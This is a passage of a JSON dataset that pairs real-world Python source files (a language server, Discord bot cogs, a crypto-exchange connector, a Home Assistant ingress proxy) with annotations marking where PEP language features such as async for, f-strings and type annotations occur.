context=None, **_kwargs):\n        return self.code_actions(textDocument['uri'], range, context)\n    def m_text_document__code_lens(self, textDocument=None, **_kwargs):\n        return self.code_lens(textDocument['uri'])\n    def m_text_document__completion(self, textDocument=None, position=None, **_kwargs):\n        return self.completions(textDocument['uri'], position)\n    def m_text_document__definition(self, textDocument=None, position=None, **_kwargs):\n        return self.definitions(textDocument['uri'], position)\n    def m_text_document__document_highlight(self, textDocument=None, position=None, **_kwargs):\n        return self.highlight(textDocument['uri'], position)\n    def m_text_document__hover(self, textDocument=None, position=None, **_kwargs):\n        return self.hover(textDocument['uri'], position)\n    def m_text_document__document_symbol(self, textDocument=None, **_kwargs):\n        return self.document_symbols(textDocument['uri'])\n    def m_text_document__formatting(self, textDocument=None, options=None, **_kwargs):\n        return self.format_document(textDocument['uri'], options)\n    def m_text_document__rename(self, textDocument=None, position=None, newName=None, **_kwargs):\n        return self.rename(textDocument['uri'], position, newName)\n    def m_text_document__folding_range(self, textDocument=None, **_kwargs):\n        return self.folding(textDocument['uri'])\n    def m_text_document__range_formatting(self, textDocument=None, range=None, options=None, **_kwargs):\n        return self.format_range(textDocument['uri'], range, options)\n    def m_text_document__references(self, textDocument=None, position=None, context=None, **_kwargs):\n        exclude_declaration = not context['includeDeclaration']\n        return self.references(textDocument['uri'], position, exclude_declaration)\n    def m_text_document__signature_help(self, textDocument=None, position=None, **_kwargs):\n        return self.signature_help(textDocument['uri'], position)\n    def m_workspace__did_change_configuration(self, settings=None):\n        if self.config is not None:\n            self.config.update((settings or {}).get('pylsp', {}))\n        for workspace in self.workspaces.values():\n            workspace.update_config(settings)\n            for doc_uri in workspace.documents:\n                self.lint(doc_uri, is_saved=False)\n    def m_workspace__did_change_workspace_folders(self, event=None, **_kwargs):  \n        if event is None:\n            return\n        added = event.get('added', [])\n        removed = event.get('removed', [])\n        for removed_info in removed:\n            if 'uri' in removed_info:\n                removed_uri = removed_info['uri']\n                self.workspaces.pop(removed_uri, None)\n        for added_info in added:\n            if 'uri' in added_info:\n                added_uri = added_info['uri']\n                workspace_config = config.Config(\n                    added_uri, self.config._init_opts,\n                    self.config._process_id, self.config._capabilities)\n                workspace_config.update(self.config._settings)\n                self.workspaces[added_uri] = Workspace(\n                    added_uri, self._endpoint, workspace_config)\n        root_workspace_removed = any(removed_info['uri'] == self.root_uri for removed_info in removed)\n        workspace_added = len(added) > 0 and 'uri' in added[0]\n        if root_workspace_removed and workspace_added:\n            added_uri = added[0]['uri']\n            self.root_uri = added_uri\n            new_root_workspace = self.workspaces[added_uri]\n            self.config = new_root_workspace._config\n            self.workspace = new_root_workspace\n        elif root_workspace_removed:\n            if self.workspaces:\n                log.debug('Root workspace deleted!')\n                available_workspaces = sorted(self.workspaces)\n                first_workspace = available_workspaces[0]\n                new_root_workspace = self.workspaces[first_workspace]\n                self.root_uri = first_workspace\n                self.config = new_root_workspace._config\n                self.workspace = new_root_workspace\n        doc_uris = list(self.workspace._docs.keys())\n        for uri in doc_uris:\n            doc = self.workspace._docs.pop(uri)\n            new_workspace = self._match_uri_to_workspace(uri)\n            new_workspace._docs[uri] = doc\n    def m_workspace__did_change_watched_files(self, changes=None, **_kwargs):\n        changed_py_files = set()\n        config_changed = False\n        for d in (changes or []):\n            if d['uri'].endswith(PYTHON_FILE_EXTENSIONS):\n                changed_py_files.add(d['uri'])\n            elif d['uri'].endswith(CONFIG_FILEs):\n                config_changed = True\n        if config_changed:\n            self.config.settings.cache_clear()\n        elif not changed_py_files:\n            return\n        for workspace in self.workspaces.values():\n            for doc_uri in workspace.documents:\n                if doc_uri not in changed_py_files:\n                    self.lint(doc_uri, is_saved=False)\n    def m_workspace__execute_command(self, command=None, arguments=None):\n        return self.execute_command(command, arguments)\ndef flatten(list_of_lists):\n    return [item for lst in list_of_lists for item in lst]\ndef merge(list_of_dicts):\n    return {k: v for dictionary in list_of_dicts for k, v in dictionary.items()}",
            "patterns": {
                "pep_468": [
                    [
                        155,
                        "hook_handlers(config=self.config, workspace=workspace, document=doc, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        68,
                        68,
                        "import",
                        "        import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        79,
                        86,
                        "async for",
                        "async for message in websocket:\n                try:\n                    log.debug(\"consuming payload and feeding it to LSP handler\")\n                    request = json.loads(message)\n                    loop = asyncio.get_running_loop()\n                    await loop.run_in_executor(tpool, pylsp_handler.consume, request)\n                except Exception as e:  \n                    log.exception(\"Failed to process request %s, %s\", message, str(e))"
                    ]
                ]
            }
        },
        "164": {
            "file": "import random\nimport typing\nimport asyncio\nasync def async_generator() -> typing.Generator[float, None, None]:\n    for i in range(10):\n        await asyncio.sleep(1)\n        yield 10 * random.random()",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        4,
                        7,
                        "async generator",
                        "async def async_generator() -> typing.Generator[float, None, None]:\n    for i in range(10):\n        await asyncio.sleep(1)\n        yield 10 * random.random()"
                    ]
                ]
            }
        },
        "165": {
            "file": "import discord, asyncio\nfrom itertools import repeat\nfrom discord.ext import commands\nfrom PythonGists import PythonGists\nfrom cogs.utils.checks import *\nfrom cogs.utils.react import *\nfrom cogs.utils.api import *\nclass blu:\n    voice = None\n    def __init__(self, bot):\n        self.bot = bot\n    async def on_message(self, message):\n        lower = message.content.lower()\n        if isinstance(message.channel, discord.abc.GuildChannel):\n            if message.guild.id == '299293492645986307':\n                if lower == '<@'+self.bot.user.id+'> wiki':\n                    await self.bot.send_message(message.channel, \"<https://github.com/appu1232/Discord-Selfbot/wiki> {p}\".format(p=self.bot.bot_prefix))\n            if message.guild.id == '295183533423591435':\n                if lower in ['plu','blu']:\n                    await self.bot.send_message(message.channel, \"is garnicht da {p}\".format(p=self.bot.bot_prefix))\n            if message.guild.id == '212421397098528779':\n                if message.author.id == '241225897389064192':\n                    if '<@97138137679028224>' in message.content:\n                        await self.bot.kick(message.author)\n            elif message.guild.id == '295183533423591435':\n                if 'pfeife' in lower:\n                    if message.author.permissions_in(message.channel).add_reactions:\n                        await message.add_reaction('pfeife:324567059658965023')\n            elif message.guild.id == '336245676952387604':\n                if 'switch' in lower:\n                    if message.author.permissions_in(message.channel).add_reactions:\n                        await message.add_reaction('switch:337258812903915530')\n                if 'kappa' in lower and not ':kappa:' in lower:\n                    if message.author.permissions_in(message.channel).add_reactions:\n                        await message.add_reaction('kappa:336835095317053440')\n        if lower == 'm\u00f6p':\n            if message.author.permissions_in(message.channel).add_reactions:\n                await message.add_reaction('\\N{REGIONAL INDICATOR SYMBOL LETTER S}')\n                await message.add_reaction('\\N{REGIONAL INDICATOR SYMBOL LETTER E}')\n                if message.author.id == self.bot.user.id:\n                    await asyncio.sleep(30)\n                    await message.remove_reaction('\\N{REGIONAL INDICATOR SYMBOL LETTER S}', self.bot.user)\n                    await message.remove_reaction('\\N{REGIONAL INDICATOR SYMBOL LETTER E}', self.bot.user)\n    @commands.command(aliases=['mr'], pass_context=True)\n    async def markread(self, ctx, channel):\n        found_channel = find_channel(ctx.message.guild.channels, channel)\n        if not found_channel:\n            found_channel = find_channel(self.bot.get_all_channels(), channel)\n        if found_channel:\n            mark_channel_read(found_channel.id, data='{\"token\":\"\"}')\n            await success(self.bot, ctx.message)\n            await asyncio.sleep(10)\n            await ctx.message.delete()\n        else:\n            await error(self.bot, ctx.message)\n            await ctx.message.channel.send( self.bot.bot_prefix + \" Channel not found.\")\n    @commands.command(pass_context=True)\n    async def functions(self, ctx, txt):\n        gist_url = PythonGists.Gist(description='', content=str(txt), name='output.txt')\n        await ctx.message.channel.send(gist_url)\n    @commands.command(pass_context=True)\n    async def raw(self, ctx, msgid: int ):\n        await ctx.message.delete()\n        async for msg in ctx.message.channel.history().filter(lambda m: m.id == msgid).map(lambda m: m.content):\n            return await ctx.message.channel.send('``` '+msg+' ```')\n    @commands.command(pass_context=True)\n    async def raw2(self, ctx, msgid: int ):\n        await ctx.message.delete()\n        async for msg in ctx.message.channel.history().filter(lambda m: m.id == msgid).map(lambda m: m.clean_content):\n            return await ctx.message.channel.send('``` '+msg+' ```')\n    @commands.command(pass_context=True)\n    async def roleadd(self, ctx, *, txt):\n        for role in ctx.message.guild.roles:\n            if role.name.lower() == txt.lower():\n                successful = 0\n                members = ctx.message.guild.members\n                await wait(self.bot, ctx.message)\n                for member in members:\n                    try:\n                        await member.add_roles(role)\n                        print('Added role \\\"{}\\\" to member \\\"{}\\\"'.format(role.name, member.name))\n                        successful += 1\n                    except:\n                        print('Unable to add role \\\"{}\\\" to member \\\"{}\\\"'.format(role.name, member.name))\n                        continue\n                await self.bot.edit_message(ctx.message, '{}Added role \\\"{}\\\" to {}/{} member(s)'.format(self.bot.bot_prefix, role.name, successful, len(members)))\n                break\n    @commands.command(pass_context=True)\n    async def roleremove(self, ctx, *, txt):\n        for role in ctx.message.guild.roles:\n            if role.name.lower() == txt.lower():\n                successful = 0\n                members = ctx.message.guild.members\n                await wait(self.bot, ctx.message)\n                for member in members:\n                    try:\n                        await member.remove_roles(role)\n                        print('Removed role \\\"{}\\\" from member \\\"{}\\\"'.format(role.name, member.name))\n                        successful += 1\n                    except:\n                        print('Unable to remove role \\\"{}\\\" from member \\\"{}\\\"'.format(role.name, member.name))\n                        continue\n                await self.bot.edit_message(ctx.message, '{}Removed role \\\"{}\\\" from {}/{} member(s)'.format(self.bot.bot_prefix, role.name, successful, len(members)))\n                break\n    @commands.command(pass_context=True)\n    async def testt(self, ctx):\n        if not self.voice: self.voice = await ctx.channel.guild.get_channel(340519588389322753).connect()\n        print('connected to %s'%self.voice.channel.name)\n        print(dir(self.voice))\n        chans = [340519588389322753, 336253620011925505, 336253277492609034, 336253484804603925, 336323927527915530]\n        for _ in repeat(None, 10):\n            for chan in chans:\n                await self.voice.move_to(ctx.channel.guild.get_channel(chan))\n                await asyncio.sleep(1)\n                print('switched to %s'%self.voice.channel.name)\n                'test'\n    @commands.command(aliases=['analyze'], pass_context=True)\n    async def analyzestring(self, ctx, *, txt):\n        _txt = \"```py\\n\"\n        txt = sorted(txt.split(' '))\n        for item in txt:\n            numbers = sum(c.isdigit() for c in item)\n            letters = sum(c.isalpha() for c in item)\n            uletters = sum(c.isupper() for c in item)\n            lletters = sum(c.islower() for c in item)\n            spaces  = sum(c.isspace() for c in item)\n            others  = len(item) - numbers - letters - spaces\n            _txt += \"Length: %02d | Numbers: %02d | Letters: %02d (Upper: %02d | Lower: %02d) | Spaces: %02d | Others: %02d\\t\\\"%s\\\"\\n\"%(len(item), numbers, letters, uletters, lletters, spaces, others, item)\n        await ctx.send(_txt+\"\\nSmallest: %s (%s) Largest: %s (%s)```\"%(min(txt),len(min(txt)), max(txt), len(max(txt))))\n    @commands.command(pass_context=True)\n    async def getnames(self, ctx):\n        await ctx.message.delete()\n        lst = set([])\n        async for message in ctx.channel.history(limit=2500):\n            if message.author.name.islower() and any(str.isdigit(c) for c in message.author.name):\n                lst.add(message.author.name)\n        lst = list(lst)\n        print('=============')\n        print(''.join(lst))\n        print('=============')\n    @commands.command(pass_context=True)\n    async def getids(self, ctx):\n        await ctx.message.delete()\n        lst = set([])\n        async for message in ctx.channel.history(limit=2500):\n            if message.author.name.islower() and any(str.isdigit(c) for c in message.author.name):\n                lst.add(str(message.author.id))\n        lst = list(lst)\n        print('=============')\n        print(' '.join(lst))\n        print('=============')\ndef setup(bot):\n    bot.add_cog(blu(bot))",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import discord, asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        64,
                        65,
                        "async for",
                        "async for msg in ctx.message.channel.history().filter(lambda m: m.id == msgid).map(lambda m: m.content):\n            return await ctx.message.channel.send('``` '+msg+' ```')"
                    ],
                    [
                        69,
                        70,
                        "async for",
                        "async for msg in ctx.message.channel.history().filter(lambda m: m.id == msgid).map(lambda m: m.clean_content):\n            return await ctx.message.channel.send('``` '+msg+' ```')"
                    ],
                    [
                        134,
                        136,
                        "async for",
                        "async for message in ctx.channel.history(limit=2500):\n            if message.author.name.islower() and any(str.isdigit(c) for c in message.author.name):\n                lst.add(message.author.name)"
                    ],
                    [
                        145,
                        147,
                        "async for",
                        "async for message in ctx.channel.history(limit=2500):\n            if message.author.name.islower() and any(str.isdigit(c) for c in message.author.name):\n                lst.add(str(message.author.id))"
                    ]
                ],
                "pep_498v": [
                    [
                        108,
                        108,
                        "%"
                    ],
                    [
                        128,
                        128,
                        "%"
                    ],
                    [
                        115,
                        115,
                        "%"
                    ],
                    [
                        129,
                        129,
                        "%"
                    ],
                    [
                        86,
                        86,
                        ".format()"
                    ],
                    [
                        103,
                        103,
                        ".format()"
                    ],
                    [
                        17,
                        17,
                        ".format()"
                    ],
                    [
                        20,
                        20,
                        ".format()"
                    ],
                    [
                        81,
                        81,
                        ".format()"
                    ],
                    [
                        98,
                        98,
                        ".format()"
                    ],
                    [
                        84,
                        84,
                        ".format()"
                    ],
                    [
                        101,
                        101,
                        ".format()"
                    ]
                ]
            }
        },
        "166": {
            "file": "import asyncio\nimport logging\nfrom typing import Any, Dict, List, Optional\nimport hummingbot.connector.exchange.bitmart.bitmart_constants as CONSTANTS\nfrom hummingbot.connector.exchange.bitmart import bitmart_utils\nfrom hummingbot.connector.exchange.bitmart.bitmart_auth import BitmartAuth\nfrom hummingbot.core.api_throttler.async_throttler import AsyncThrottler\nfrom hummingbot.core.data_type.user_stream_tracker_data_source import UserStreamTrackerDataSource\nfrom hummingbot.core.web_assistant.connections.data_types import WSRequest\nfrom hummingbot.core.web_assistant.rest_assistant import RESTAssistant\nfrom hummingbot.core.web_assistant.web_assistants_factory import WebAssistantsFactory\nfrom hummingbot.core.web_assistant.ws_assistant import WSAssistant\nfrom hummingbot.logger import HummingbotLogger\nclass BitmartAPIUserStreamDataSource(UserStreamTrackerDataSource):\n    MAX_RETRIES = 20\n    MESSAGE_TIMEOUT = 10.0\n    PING_TIMEOUT = 2.0\n    _logger: Optional[HummingbotLogger] = None\n    @classmethod\n    def logger(cls) -> HummingbotLogger:\n        if cls._logger is None:\n            cls._logger = logging.getLogger(__name__)\n        return cls._logger\n    @classmethod\n    def _get_throttler_instance(cls) -> AsyncThrottler:\n        throttler = AsyncThrottler(CONSTANTS.RATE_LIMITS)\n        return throttler\n    def __init__(\n        self,\n        bitmart_auth: BitmartAuth,\n        throttler: Optional[AsyncThrottler] = None,\n        trading_pairs: Optional[List[str]] = None,\n        api_factory: Optional[WebAssistantsFactory] = None\n    ):\n        super().__init__()\n        self._api_factory = api_factory or bitmart_utils.build_api_factory()\n        self._rest_assistant = None\n        self._ws_assistant = None\n        self._bitmart_auth: BitmartAuth = bitmart_auth\n        self._trading_pairs = trading_pairs or []\n        self._current_listen_key = None\n        self._listen_for_user_stream_task = None\n        self._throttler = throttler or self._get_throttler_instance()\n    @property\n    def last_recv_time(self) -> float:\n        if self._ws_assistant is not None:\n            return self._ws_assistant.last_recv_time\n        else:\n            return 0\n    async def _get_ws_assistant(self) -> RESTAssistant:\n        if self._ws_assistant is None:\n            self._ws_assistant = await self._api_factory.get_ws_assistant()\n        return self._ws_assistant\n    async def _authenticate(self, ws: WSAssistant):\n        try:\n            auth_payload: Dict[str, Any] = self._bitmart_auth.get_ws_auth_payload(bitmart_utils.get_ms_timestamp())\n            ws_message: WSRequest = WSRequest(auth_payload)\n            await ws.send(ws_message)\n            ws_response = await ws.receive()\n            auth_resp: Dict[str, Any] = ws_response.data\n            if \"errorCode\" in auth_resp.keys():\n                self.logger().error(f\"WebSocket login errored with message: {auth_resp['errorMessage']}\",\n                                    exc_info=True)\n                raise ConnectionError\n        except asyncio.CancelledError:\n            raise\n        except Exception:\n            self.logger().error(\"Error occurred when authenticating to user stream.\", exc_info=True)\n            raise\n    async def _subscribe_to_channels(self, ws: WSAssistant):\n        try:\n            for trading_pair in self._trading_pairs:\n                ws_message: WSRequest = WSRequest({\n                    \"op\": \"subscribe\",\n                    \"args\": [f\"spot/user/order:{bitmart_utils.convert_to_exchange_trading_pair(trading_pair)}\"]\n                })\n                await ws.send(ws_message)\n        except asyncio.CancelledError:\n            raise\n        except Exception:\n            self.logger().error(\"Error occured during subscribing to Bitmart private channels.\", exc_info=True)\n            raise\n    async def listen_for_user_stream(self, output: asyncio.Queue):\n        while True:\n            try:\n                ws: WSAssistant = await self._get_ws_assistant()\n                try:\n                    await ws.connect(ws_url=CONSTANTS.WSS_URL,\n                                     message_timeout=self.MESSAGE_TIMEOUT,\n                                     ping_timeout=self.PING_TIMEOUT)\n                except RuntimeError:\n                    self.logger().info(\"BitMart WebSocket already connected.\")\n                self.logger().info(\"Authenticating to User Stream...\")\n                await self._authenticate(ws)\n                self.logger().info(\"Successfully authenticated to User Stream.\")\n                await self._subscribe_to_channels(ws)\n                self.logger().info(\"Successfully subscribed to all Private channels.\")\n                while True:\n                    try:\n                        async for raw_msg in ws.iter_messages():\n                            messages = raw_msg.data\n                            if messages is None:\n                                continue\n                            if \"errorCode\" in messages.keys() or \\\n                               \"data\" not in messages.keys() or \\\n                               \"table\" not in messages.keys():\n                                continue\n                            if messages[\"table\"] != \"spot/user/order\":\n                                continue\n                            output.put_nowait(messages)\n                        break\n                    except asyncio.exceptions.TimeoutError:\n                        await ws.ping()\n            except asyncio.CancelledError:\n                raise\n            except asyncio.exceptions.TimeoutError:\n                self.logger().warning(\"WebSocket ping timed out. Going to reconnect...\")\n                await ws.disconnect()\n                await asyncio.sleep(30.0)\n            except Exception:\n                self.logger().error(\n                    \"Unexpected error with BitMart WebSocket connection. Retrying after 30 seconds...\",\n                    exc_info=True\n                )\n                await ws.disconnect()\n                await asyncio.sleep(30.0)",
            "patterns": {
                "pep_526": [
                    [
                        18,
                        "_logger: Optional[HummingbotLogger] = None"
                    ],
                    [
                        39,
                        "self._bitmart_auth: BitmartAuth = bitmart_auth"
                    ],
                    [
                        56,
                        "auth_payload: Dict[str, Any] = self._bitmart_auth.get_ws_auth_payload(bitmart_utils.get_ms_timestamp())"
                    ],
                    [
                        57,
                        "ws_message: WSRequest = WSRequest(auth_payload)"
                    ],
                    [
                        60,
                        "auth_resp: Dict[str, Any] = ws_response.data"
                    ],
                    [
                        73,
                        "ws_message: WSRequest = WSRequest({"
                    ],
                    [
                        86,
                        "ws: WSAssistant = await self._get_ws_assistant()"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import Any, Dict, List, Optional",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import Any, Dict, List, Optional",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        56,
                        "            auth_payload: Dict[str, Any] = self._bitmart_auth.get_ws_auth_payload(bitmart_utils.get_ms_timestamp())",
                        "violation"
                    ],
                    [
                        60,
                        "            auth_resp: Dict[str, Any] = ws_response.data",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        100,
                        110,
                        "async for",
                        "async for raw_msg in ws.iter_messages():\n                            messages = raw_msg.data\n                            if messages is None:\n                                continue\n                            if \"errorCode\" in messages.keys() or \\\n                               \"data\" not in messages.keys() or \\\n                               \"table\" not in messages.keys():\n                                continue\n                            if messages[\"table\"] != \"spot/user/order\":\n                                continue\n                            output.put_nowait(messages)"
                    ]
                ],
                "pep_498": [
                    [
                        62,
                        "                self.logger().error(f\"WebSocket login errored with message: {auth_resp['errorMessage']}\","
                    ],
                    [
                        75,
                        "                    \"args\": [f\"spot/user/order:{bitmart_utils.convert_to_exchange_trading_pair(trading_pair)}\"]"
                    ]
                ]
            }
        },
        "167": {
            "file": "import asyncio\nfrom ipaddress import ip_address\nimport logging\nfrom typing import Any, Dict, Union\nimport aiohttp\nfrom aiohttp import hdrs, web\nfrom aiohttp.web_exceptions import (\n    HTTPBadGateway,\n    HTTPServiceUnavailable,\n    HTTPUnauthorized,\n)\nfrom multidict import CIMultiDict, istr\nimport voluptuous as vol\nfrom ..addons.addon import Addon\nfrom ..const import (\n    ATTR_ADMIN,\n    ATTR_ENABLE,\n    ATTR_ICON,\n    ATTR_PANELS,\n    ATTR_SESSION,\n    ATTR_TITLE,\n    COOKIE_INGRESS,\n    HEADER_TOKEN,\n    HEADER_TOKEN_OLD,\n)\nfrom ..coresys import CoreSysAttributes\nfrom .utils import api_process, api_validate, require_home_assistant\n_LOGGER: logging.Logger = logging.getLogger(__name__)\nVALIDATE_SESSION_DATA = vol.Schema({ATTR_SESSION: str})\nclass APIIngress(CoreSysAttributes):\n    def _extract_addon(self, request: web.Request) -> Addon:\n        token = request.match_info.get(\"token\")\n        addon = self.sys_ingress.get(token)\n        if not addon:\n            _LOGGER.warning(\"Ingress for %s not available\", token)\n            raise HTTPServiceUnavailable()\n        return addon\n    def _create_url(self, addon: Addon, path: str) -> str:\n        return f\"http://{addon.ip_address}:{addon.ingress_port}/{path}\"\n    @api_process\n    async def panels(self, request: web.Request) -> Dict[str, Any]:\n        addons = {}\n        for addon in self.sys_ingress.addons:\n            addons[addon.slug] = {\n                ATTR_TITLE: addon.panel_title,\n                ATTR_ICON: addon.panel_icon,\n                ATTR_ADMIN: addon.panel_admin,\n                ATTR_ENABLE: addon.ingress_panel,\n            }\n        return {ATTR_PANELS: addons}\n    @api_process\n    @require_home_assistant\n    async def create_session(self, request: web.Request) -> Dict[str, Any]:\n        session = self.sys_ingress.create_session()\n        return {ATTR_SESSION: session}\n    @api_process\n    @require_home_assistant\n    async def validate_session(self, request: web.Request) -> Dict[str, Any]:\n        data = await api_validate(VALIDATE_SESSION_DATA, request)\n        if not self.sys_ingress.validate_session(data[ATTR_SESSION]):\n            _LOGGER.warning(\"No valid ingress session %s\", data[ATTR_SESSION])\n            raise HTTPUnauthorized()\n    @require_home_assistant\n    async def handler(\n        self, request: web.Request\n    ) -> Union[web.Response, web.StreamResponse, web.WebSocketResponse]:\n        session = request.cookies.get(COOKIE_INGRESS)\n        if not self.sys_ingress.validate_session(session):\n            _LOGGER.warning(\"No valid ingress session %s\", session)\n            raise HTTPUnauthorized()\n        addon = self._extract_addon(request)\n        path = request.match_info.get(\"path\")\n        try:\n            if _is_websocket(request):\n                return await self._handle_websocket(request, addon, path)\n            return await self._handle_request(request, addon, path)\n        except aiohttp.ClientError as err:\n            _LOGGER.error(\"Ingress error: %s\", err)\n        raise HTTPBadGateway()\n    async def _handle_websocket(\n        self, request: web.Request, addon: Addon, path: str\n    ) -> web.WebSocketResponse:\n        if hdrs.SEC_WEBSOCKET_PROTOCOL in request.headers:\n            req_protocols = [\n                str(proto.strip())\n                for proto in request.headers[hdrs.SEC_WEBSOCKET_PROTOCOL].split(\",\")\n            ]\n        else:\n            req_protocols = ()\n        ws_server = web.WebSocketResponse(\n            protocols=req_protocols, autoclose=False, autoping=False\n        )\n        await ws_server.prepare(request)\n        url = self._create_url(addon, path)\n        source_header = _init_header(request, addon)\n        if request.query_string:\n            url = f\"{url}?{request.query_string}\"\n        async with self.sys_websession.ws_connect(\n            url,\n            headers=source_header,\n            protocols=req_protocols,\n            autoclose=False,\n            autoping=False,\n        ) as ws_client:\n            await asyncio.wait(\n                [\n                    _websocket_forward(ws_server, ws_client),\n                    _websocket_forward(ws_client, ws_server),\n                ],\n                return_when=asyncio.FIRST_COMPLETED,\n            )\n        return ws_server\n    async def _handle_request(\n        self, request: web.Request, addon: Addon, path: str\n    ) -> Union[web.Response, web.StreamResponse]:\n        url = self._create_url(addon, path)\n        data = await request.read()\n        source_header = _init_header(request, addon)\n        async with self.sys_websession.request(\n            request.method,\n            url,\n            headers=source_header,\n            params=request.query,\n            allow_redirects=False,\n            data=data,\n        ) as result:\n            headers = _response_header(result)\n            if (\n                hdrs.CONTENT_LENGTH in result.headers\n                and int(result.headers.get(hdrs.CONTENT_LENGTH, 0)) < 4_194_000\n            ):\n                body = await result.read()\n                return web.Response(\n                    headers=headers,\n                    status=result.status,\n                    content_type=result.content_type,\n                    body=body,\n                )\n            response = web.StreamResponse(status=result.status, headers=headers)\n            response.content_type = result.content_type\n            try:\n                await response.prepare(request)\n                async for data in result.content.iter_chunked(4096):\n                    await response.write(data)\n            except (\n                aiohttp.ClientError,\n                aiohttp.ClientPayloadError,\n                ConnectionResetError,\n            ) as err:\n                _LOGGER.error(\"Stream error with %s: %s\", url, err)\n            return response\ndef _init_header(\n    request: web.Request, addon: str\n) -> Union[CIMultiDict, Dict[str, str]]:\n    headers = {}\n    for name, value in request.headers.items():\n        if name in (\n            hdrs.CONTENT_LENGTH,\n            hdrs.CONTENT_ENCODING,\n            hdrs.SEC_WEBSOCKET_EXTENSIONS,\n            hdrs.SEC_WEBSOCKET_PROTOCOL,\n            hdrs.SEC_WEBSOCKET_VERSION,\n            hdrs.SEC_WEBSOCKET_KEY,\n            istr(HEADER_TOKEN),\n            istr(HEADER_TOKEN_OLD),\n        ):\n            continue\n        headers[name] = value\n    forward_for = request.headers.get(hdrs.X_FORWARDED_FOR)\n    connected_ip = ip_address(request.transport.get_extra_info(\"peername\")[0])\n    headers[hdrs.X_FORWARDED_FOR] = f\"{forward_for}, {connected_ip!s}\"\n    return headers\ndef _response_header(response: aiohttp.ClientResponse) -> Dict[str, str]:\n    headers = {}\n    for name, value in response.headers.items():\n        if name in (\n            hdrs.TRANSFER_ENCODING,\n            hdrs.CONTENT_LENGTH,\n            hdrs.CONTENT_TYPE,\n            hdrs.CONTENT_ENCODING,\n        ):\n            continue\n        headers[name] = value\n    return headers\ndef _is_websocket(request: web.Request) -> bool:\n    headers = request.headers\n    if (\n        \"upgrade\" in headers.get(hdrs.CONNECTION, \"\").lower()\n        and headers.get(hdrs.UPGRADE, \"\").lower() == \"websocket\"\n    ):\n        return True\n    return False\nasync def _websocket_forward(ws_from, ws_to):\n    try:\n        async for msg in ws_from:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                await ws_to.send_str(msg.data)\n            elif msg.type == aiohttp.WSMsgType.BINARY:\n                await ws_to.send_bytes(msg.data)\n            elif msg.type == aiohttp.WSMsgType.PING:\n                await ws_to.ping()\n            elif msg.type == aiohttp.WSMsgType.PONG:\n                await ws_to.pong()\n            elif ws_to.closed:\n                await ws_to.close(code=ws_to.close_code, message=msg.extra)\n    except RuntimeError:\n        _LOGGER.warning(\"Ingress Websocket runtime error\")",
            "patterns": {
                "pep_526": [
                    [
                        28,
                        "_LOGGER: logging.Logger = logging.getLogger(__name__)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        4,
                        "from typing import Any, Dict, Union",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        173,
                        "def _response_header(response: aiohttp.ClientResponse) -> Dict[str, str]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        195,
                        205,
                        "async for",
                        "async for msg in ws_from:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                await ws_to.send_str(msg.data)\n            elif msg.type == aiohttp.WSMsgType.BINARY:\n                await ws_to.send_bytes(msg.data)\n            elif msg.type == aiohttp.WSMsgType.PING:\n                await ws_to.ping()\n            elif msg.type == aiohttp.WSMsgType.PONG:\n                await ws_to.pong()\n            elif ws_to.closed:\n                await ws_to.close(code=ws_to.close_code, message=msg.extra)"
                    ],
                    [
                        143,
                        144,
                        "async for",
                        "async for data in result.content.iter_chunked(4096):\n                    await response.write(data)"
                    ]
                ],
                "pep_515": [
                    [
                        130,
                        "                and int(result.headers.get(hdrs.CONTENT_LENGTH, 0)) < 4_194_000"
                    ]
                ],
                "pep_498": [
                    [
                        171,
                        "    headers[hdrs.X_FORWARDED_FOR] = f\"{forward_for}, {connected_ip!s}\""
                    ],
                    [
                        39,
                        "        return f\"http://{addon.ip_address}:{addon.ingress_port}/{path}\""
                    ],
                    [
                        97,
                        "            url = f\"{url}?{request.query_string}\""
                    ]
                ]
            }
        },
        "168": {
            "file": "import discord\nfrom discord.ext import commands\nimport asyncio\nfrom dateutil.relativedelta import relativedelta as rdelta\nimport traceback\nimport m10s_util as ut\nclass owner(commands.Cog):\n    def __init__(self, bot):\n        self.bot = bot\n    @commands.command()\n    @commands.is_owner()\n    async def get_ch_id(self, ctx, cnm: str):\n        text = [f\"{str(ch)} ({ch.id})\" for ch in ctx.guild.channels if cnm in str(ch)]\n        t = \"\\n\".join(text)\n        await ctx.send(embed=ut.getEmbed(\"\u4e00\u81f4\u30c1\u30e3\u30f3\u30cd\u30eb\", f\"```{t}```\"))\n    @commands.command()\n    @commands.is_owner()\n    async def chlogs(self, ctx, cid: int, count: int):\n        ch = self.bot.get_channel(cid)\n        async for m in ch.history(limit=count):\n            await ctx.author.send(embed=ut.getEmbed(\"\u30e1\u30c3\u30bb\u30fc\u30b8\", m.clean_content, self.bot.ec, \"\u9001\u4fe1\u8005\", str(m.author)))\n            await asyncio.sleep(2)\n    @commands.command()\n    @commands.is_owner()\n    async def dcomrun(self, ctx, cname, *, ags):\n        c = ctx\n        c.args = list(ags)\n        try:\n            await c.invoke(self.bot.get_command(cname))\n        except:\n            await ctx.send(embed=discord.Embed(title=\"dcomrun\u30a8\u30e9\u30fc\", description=traceback.format_exc(0)))\n    @commands.command()\n    @commands.is_owner()\n    async def cu(self, ctx):\n        await ctx.send(\"see you...\")\n        await self.bot.close()\n    @commands.command()\n    async def aev(self, ctx, *, cmd):\n        if \"eval\" in self.bot.features.get(ctx.author.id, []):\n            try:\n                await eval(cmd)\n                await ctx.message.add_reaction(self.bot.get_emoji(653161518103265291))\n            except:\n                await ctx.send(embed=discord.Embed(title=\"awaitEval\u30a8\u30e9\u30fc\", description=traceback.format_exc(0)))\n    @commands.command()\n    async 